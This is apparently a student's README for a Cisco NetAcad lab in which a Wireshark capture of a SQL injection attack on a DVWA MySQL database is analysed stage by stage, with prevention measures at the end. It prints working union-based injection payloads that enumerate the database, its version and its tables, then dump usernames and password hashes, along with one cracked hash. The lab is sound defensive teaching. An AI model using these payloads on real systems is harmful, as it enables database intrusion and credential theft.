<div align="center">

# 💉 Lab - Attacking a MySQL Database

**Cisco Networking Academy | Wireshark | SQL Injection Analysis**

<p>
  <img src="https://img.shields.io/badge/Tool-Wireshark-1679A7?style=for-the-badge" alt="Wireshark">
  <img src="https://img.shields.io/badge/Database-MySQL-4479A1?style=for-the-badge" alt="MySQL">
  <img src="https://img.shields.io/badge/Topic-SQL%20Injection-critical?style=for-the-badge" alt="SQL Injection">
  <img src="https://img.shields.io/badge/Cisco-NetAcad-1BA0D7?style=for-the-badge" alt="Cisco NetAcad">
</p>

<p>
  Analyze a captured SQL injection attack and identify how database information was exposed through HTTP traffic.
</p>

</div>

---

## 🎯 Objectives

| Part | Objective |
|---|---|
| **Part 1** | Open Wireshark and load the PCAP file |
| **Part 2** | View the SQL Injection Attack |
| **Part 3** | Analyze the continuation of the SQL Injection Attack |
| **Part 4** | Identify system information |
| **Part 5** | Analyze database table information |
| **Part 6** | Analyze the conclusion of the attack |

---

## 🧰 Required Resources

- 💻 CyberOps Workstation virtual machine
- 🦈 Wireshark
- 📦 `SQL_Lab.pcap`

---

# 🧠 Background

SQL injection attacks allow malicious hackers to enter SQL statements through a website and receive responses from the database.

This can allow attackers to:

- Tamper with database data
- Retrieve database information
- Spoof identities
- Discover system and database information
- Obtain sensitive information such as password hashes

This lab provides a previously captured network trace of a SQL injection attack. Wireshark is used to follow the HTTP streams and examine the attack step by step.

> ⚠️ **Lab Context:** The analysis in this README is based on the provided Cisco NetAcad PCAP-analysis lab. The SQL injection activity described here is examined from a previously captured traffic file.

---

# 🦈 Part 1 — Open Wireshark and Load the PCAP

1. Start the **CyberOps Workstation VM**.
2. Open:

```text
Applications > CyberOPS > Wireshark
```

3. In Wireshark, select **Open**.
4. Browse to:

```text
/home/analyst/lab.support.files/
```

5. Open:

```text
SQL_Lab.pcap
```

The capture contains approximately **441 seconds (8 minutes)** of traffic representing the SQL injection attack.

### 🔎 IP Addresses Involved

| Device | IP Address |
|---|---|
| Source / Attacker | `10.0.2.4` |
| Target | `10.0.2.15` |

---

# 💉 Part 2 — View the SQL Injection Attack

The first stage demonstrates how the attacker tests whether the application is vulnerable to SQL injection.

## Follow the HTTP Stream

In Wireshark:

1. Right-click **line 13**.
2. Select:

```text
Follow > HTTP Stream
```

3. In the **Find** field, search for:

```text
1=1
```

The source traffic is shown in red, while the destination response is shown in blue.

### 🔬 Injection Test

The attacker submits:

```text
1=1
```

through the **UserID** search field on the target:

```text
10.0.2.15
```

The application returns a database record instead of a normal login failure.

The expression:

```text
1=1
```

is always true, allowing the attacker to test whether SQL input is being interpreted by the application.

---

# 🗄️ Part 3 — The SQL Injection Attack Continues

The attacker continues by attempting to extract database information.

The following input is sent through the UserID field:

```sql
1' or 1=1 union select database(), user()#
```

The response reveals:

| Information | Result |
|---|---|
| Database | `dvwa` |
| Database User | `root@localhost` |
| Additional Information | Multiple user accounts |

This demonstrates that the attacker has moved beyond testing the vulnerability and is extracting information from the database.

---

# 🖥️ Part 4 — SQL Injection Provides System Information

The attacker attempts to identify the database version.

Follow the HTTP stream for **line 22** and search for:

```text
1=1
```

The query used is:

```sql
1' or 1=1 union select null, version()#
```

### 📌 Database Version

```text
MySQL 5.7.12-0
```

The version identifier appears at the end of the returned output before the closing HTML tags.

---

# 🗃️ Part 5 — SQL Injection and Table Information

The attacker attempts to discover tables stored in the database.

Follow the HTTP stream for **line 25** and search for:

```text
users
```

The query used is:

```sql
1'or 1=1 union select null, table_name from information_schema.tables#
```

This query requests table names from:

```text
information_schema.tables
```

The result contains a large number of database tables.

## 🔍 Filtering for the `users` Table

The lab asks what the following modified query would do:

```sql
1' OR 1=1 UNION SELECT null, column_name
FROM INFORMATION_SCHEMA.columns
WHERE table_name='users'
```

The modified query would produce a much shorter output by filtering the results to columns associated with the:

```text
users
```

table.

---

# 🔐 Part 6 — The SQL Injection Attack Concludes

The final stage extracts usernames and password hashes.

Follow the HTTP stream for **line 28** and search for:

```text
1=1
```

The attacker uses:

```sql
1'or 1=1 union select user, password from users#
```

This query retrieves:

- Usernames
- Password hashes

### 🧩 Recovered Credentials

| Item | Value |
|---|---|
| Password Hash | `8d3533d75ae2c3966d7e0d4fcc69216b` |
| User | `1337` |
| Plain-text Password | `charley` |

The lab uses a password hash-cracking website to recover the plain-text password.

---

# 📊 Attack Progression

The attack progresses from vulnerability testing to database enumeration and credential extraction:

```text
1=1
   ↓
SQL Injection Confirmed
   ↓
database() + user()
   ↓
Database & User Information
   ↓
version()
   ↓
MySQL Version
   ↓
information_schema.tables
   ↓
Database Table Enumeration
   ↓
users Table
   ↓
user + password
   ↓
Password Hashes
```

---

# 🧪 Reflection

## 1. What is the risk of having platforms use SQL?

Websites are commonly database-driven and use SQL. The severity of a SQL injection attack depends on what the attacker can access and retrieve through the vulnerable application.

The lab demonstrates how SQL injection can progress from a simple vulnerability test to the extraction of database information and password hashes.

---

## 2. How can SQL injection attacks be prevented?

The lab identifies several possible prevention measures:

- Filter user input
- Deploy a Web Application Firewall (WAF)
- Disable unnecessary database features and capabilities
- Monitor SQL statements
- Use parameters with stored procedures
- Use parameters with dynamic SQL

---

# 🛡️ Cybersecurity Relevance

This lab demonstrates the importance of understanding application-layer attacks from a defensive perspective.

Analyzing the PCAP shows how an attacker can progressively gather information:

| Stage | Information Exposed |
|---|---|
| Initial Test | SQL injection vulnerability |
| Enumeration | Database and database user |
| Fingerprinting | MySQL version |
| Discovery | Database tables |
| Targeting | `users` table |
| Credential Extraction | Usernames and password hashes |

For SOC and Blue Team analysts, packet captures can provide valuable evidence of suspicious HTTP requests and database-oriented attack activity.

---

# 🧠 Key Takeaways

- 🦈 Wireshark can be used to investigate previously captured attack traffic.
- 💉 SQL injection can allow user-controlled input to interact with a database.
- 🔎 Attackers may progressively enumerate database information.
- 🗄️ `information_schema` can expose database metadata when an application is vulnerable.
- 🔐 Password hashes can become exposed through successful SQL injection.
- 📡 Following HTTP streams makes application-layer requests and responses easier to analyze.
- 🛡️ Input validation and parameterized database queries are important defensive controls.
- 🚨 PCAP analysis can help security analysts understand the sequence and impact of an attack.

---

<div align="center">

### 🔐 Network Security • SQL Injection • Wireshark • SOC Analysis

**Cisco Networking Academy Lab**

</div>
